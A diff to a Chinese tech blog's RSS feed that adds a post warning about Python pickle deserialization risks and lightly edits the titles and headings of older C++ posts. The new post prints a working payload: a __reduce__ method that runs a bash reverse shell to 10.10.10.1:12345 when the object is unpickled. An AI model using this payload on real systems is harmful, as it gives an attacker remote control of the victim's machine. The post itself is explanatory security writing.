@@ -6,7 +6,36 @@
     <description>Recent content in 技术 on 蘭陵N梓記</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-CN</language>
-    <lastBuildDate>Sun, 07 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 13 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="http://lanlingzi.cn/categories/%E6%8A%80%E6%9C%AF/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>飞哥讲代码24：从Python Pickle漏洞说起</title>
+      <link>http://lanlingzi.cn/post/technical/2021/0313_code/</link>
+      <pubDate>Sat, 13 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://lanlingzi.cn/post/technical/2021/0313_code/</guid>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;《泾溪》&amp;ndash; 杜荀鹤&lt;br&gt;
+泾溪石险人兢慎，终岁不闻倾覆人。&lt;br&gt;
+却是平流无石处，时时闻说有沉论。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
+&lt;p&gt;有次同事找我看个Python的安全问题。测试代码是这样的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;pickle&lt;/span&gt;
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#008b45;text-decoration:underline&#34;&gt;os&lt;/span&gt;
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Test&lt;/span&gt;(&lt;span style=&#34;color:#658b00&#34;&gt;object&lt;/span&gt;):
+    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;__reduce__&lt;/span&gt;(self):
+        cmd = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;&amp;#34;&amp;#34;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.10.1/12345 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; (os.system,(cmd,))
+
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; __name__ == &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    test = Test()
+    bs = pickle.dumps(test)
+    pickle.loads(bs)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个是利用pickle反序列化漏洞，结合shell反弹的安全入侵。当代码执行之后，会后台与10.10.10.1:12345建立连接，在10.10.10.1上的用户则可以直接像ssh远程一样操作你的机器。&lt;/p&gt;
+&lt;p&gt;目前Python在AI领域应用越来越多，不少传统机器学习的模型也采用pickle格式保存。如基于sklearn训练的模型，通常采用pickle.dump把模型生成pkl文件，当再使用模型时，则通过pickle.load加载模型来进行推理预测。像Java中json/xml/yaml的序列化与反序列化一样，python的pickle对象序列化与反序列化存在更为严重的安全风险。&lt;/p&gt;</description>
+    </item>
+    
     <item>
       <title>飞哥讲代码23：C/C&#43;&#43;内存空洞</title>
       <link>http://lanlingzi.cn/post/technical/2021/0307_code/</link>
@@ -2114,56 +2143,55 @@ os.remove(file_name)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之名字空间namespace</title>
+      <title>c&#43;&#43;技巧之名字空间namespace</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_namespace_usage/</link>
       <pubDate>Mon, 13 Jul 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_namespace_usage/</guid>
       <description>&lt;p&gt;C开发人员会经常使用&lt;code&gt;#define&lt;/code&gt;即宏来声明常量，但宏却是全局的，对大的工程来说是很难维护，经常是导致名字冲突。还好，C++给我们带来了&lt;code&gt;namespace&lt;/code&gt;名字空间。它的使用如下，名字空间可以把一组逻辑分组，同时名字空间也是一种作用域。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;namespace outspname  
-{   
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;namespace outspname {   
    const int CVAR1 = 1;  
    const char* const CVAR2 = &amp;#34;33333&amp;#34;;  
    void test();  
 
-   namespace inspname  
-   {  
+   namespace inspname {  
       enum { A, B, C};  
-      class Klass  
-      {  
-      };  
+      class Klass {};  
    }  
 }
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
-      <title>[C&#43;&#43;] STL容器中erase方法的不同陷阱</title>
+      <title>c&#43;&#43; STL容器erase方法的不同陷阱</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_erase_fault/</link>
       <pubDate>Wed, 01 Jul 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_erase_fault/</guid>
-      <description>&lt;p&gt;&lt;code&gt;STL&lt;/code&gt;中的容器都有&lt;code&gt;erase&lt;/code&gt;方法，容器的存储分为顺序存储(如&lt;code&gt;vector&lt;/code&gt;)与链式存储(如&lt;code&gt;list,map&lt;/code&gt;)。先以&lt;code&gt;map&lt;/code&gt;为例:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;typedef std::map&amp;lt;std::string, std::string&amp;gt; TStrMap;  
-typedef TStrMap::iterator TStrMapIter;  
+      <description>&lt;h2 id=&#34;陷阱&#34;&gt;陷阱&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;STL&lt;/code&gt;中的容器都有&lt;code&gt;erase&lt;/code&gt;方法，容器的存储分为顺序存储(如&lt;code&gt;vector&lt;/code&gt;)与链式存储(如&lt;code&gt;list,map&lt;/code&gt;)。先以&lt;code&gt;map&lt;/code&gt;为例:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;typedef&lt;/span&gt; std::map&amp;lt;std::string, std::string&amp;gt; TStrMap;  
+&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;typedef&lt;/span&gt; TStrMap::iterator TStrMapIter;  
+
 TStrMap strmap;  
-TStrMapIter iter = strmap.find(&amp;#34;somekey&amp;#34;);  
+TStrMapIter iter = strmap.find(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;somekey&amp;#34;&lt;/span&gt;);  
 strmap.erase(iter);
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样使用&lt;code&gt;erase&lt;/code&gt;方法没有任何问题，删除一个单结节之后，&lt;code&gt;stl&lt;/code&gt;中的&lt;code&gt;iterator&lt;/code&gt;都是与其中的数据元素关联的，关联的元素删除之后，&lt;code&gt;ite&lt;/code&gt;r已就失效，&lt;code&gt;iter&lt;/code&gt;理解为指向元素的指针，那删除之后可以简单理解为已是一个野指针。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>C&#43;&#43;的仿函数与动态语言的闭包</title>
+      <title>c&#43;&#43;的仿函数与动态语言的闭包</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_closure_pkg/</link>
       <pubDate>Mon, 29 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_closure_pkg/</guid>
-      <description>&lt;p&gt;什么是闭包，我们先来用&lt;code&gt;ruby&lt;/code&gt;看个例子：&lt;/p&gt;
+      <description>&lt;h2 id=&#34;闭包&#34;&gt;闭包&lt;/h2&gt;
+&lt;p&gt;什么是闭包，我们先来用&lt;code&gt;ruby&lt;/code&gt;看个例子：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;sum = 0  
 10.times{|n| sum += n}   
 print sum
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中&lt;code&gt;{}&lt;/code&gt;就是闭包的内容，代码看起来是不是很清爽与简单。&lt;/p&gt;
-&lt;p&gt;我们还来看看&lt;code&gt;Python&lt;/code&gt;写的闭包：&lt;/p&gt;
+&lt;p&gt;我们再来看看&lt;code&gt;Python&lt;/code&gt;写的闭包：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;def addx(x):      
     return lambda y: x + y  
 add8 = addx(8)  
@@ -2172,25 +2200,27 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之栈变量的析构应用</title>
+      <title>c&#43;&#43;技巧之栈变量的析构应用</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_stack_usage/</link>
       <pubDate>Thu, 25 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_stack_usage/</guid>
-      <description>&lt;p&gt;栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。&lt;/p&gt;</description>
+      <description>&lt;h2 id=&#34;栈变量&#34;&gt;栈变量&lt;/h2&gt;
+&lt;p&gt;栈变量有一个好处，就是它退栈时会自动析构，并且在栈上对象生成比在堆上分配效率高很多。但每个线程的栈空间是有限的(创建线程时可以设置)，所以一般的临时小对象都会在栈上分配。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之operator操作符</title>
+      <title>c&#43;&#43;技巧之operator操作符</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_operator/</link>
       <pubDate>Wed, 24 Jun 2009 00:00:00 +0000</pubDate>
       
       <guid>http://lanlingzi.cn/post/technical/csdn/cpp_operator/</guid>
-      <description>&lt;p&gt;这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得&lt;code&gt;operator&lt;/code&gt;比较好玩。C++有时它的确是个耐玩的东东。&lt;code&gt;operator&lt;/code&gt;它有两种用法，一种是&lt;code&gt;operator overloading&lt;/code&gt;（操作符重载），一种是&lt;code&gt;operator casting&lt;/code&gt;（操作隐式转换）。&lt;/p&gt;</description>
+      <description>&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+&lt;p&gt;这篇博文是以前很久写的，贴在我的早期一个blog中，今天google一下，发现还真有不少人转载，可惜并不注明出处。那时觉得&lt;code&gt;operator&lt;/code&gt;比较好玩。C++有时它的确是个耐玩的东东。&lt;code&gt;operator&lt;/code&gt;它有两种用法，一种是&lt;code&gt;operator overloading&lt;/code&gt;（操作符重载），一种是&lt;code&gt;operator casting&lt;/code&gt;（操作隐式转换）。&lt;/p&gt;</description>
     </item>
     
     <item>
-      <title>[c&#43;&#43;]自己实现的queue</title>
+      <title>c&#43;&#43;实现的queue</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_queue/</link>
       <pubDate>Sat, 20 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2199,7 +2229,7 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之断言Assert</title>
+      <title>c&#43;&#43;技巧之断言Assert</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_static_assert/</link>
       <pubDate>Sun, 14 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2208,7 +2238,7 @@ print add8(100)
     </item>
     
     <item>
-      <title>C&#43;&#43;技巧之宏Macro应用</title>
+      <title>c&#43;&#43;技巧之宏Macro应用</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_macro_rule/</link>
       <pubDate>Fri, 12 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2230,7 +2260,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>[c&#43;&#43;]自己实现的stack</title>
+      <title>c&#43;&#43;实现的stack</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_self_impl_stack/</link>
       <pubDate>Thu, 11 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2239,7 +2269,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>用C&#43;&#43;模板来展示new与delete操作符原理</title>
+      <title>用c&#43;&#43;模板来展示new与delete操作符原理</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_new_delete/</link>
       <pubDate>Mon, 08 Jun 2009 00:00:00 +0000</pubDate>
       
@@ -2254,7 +2284,7 @@ MAX(3,4)使用没有问题，但MAX(3+4, 4)却有问题，因为宏的参数仅�
     </item>
     
     <item>
-      <title>[c&#43;&#43;]常见的几个排序算法</title>
+      <title>c&#43;&#43;常见的几个排序算法</title>
       <link>http://lanlingzi.cn/post/technical/csdn/cpp_aglos/</link>
       <pubDate>Sun, 07 Jun 2009 00:00:00 +0000</pubDate>
       
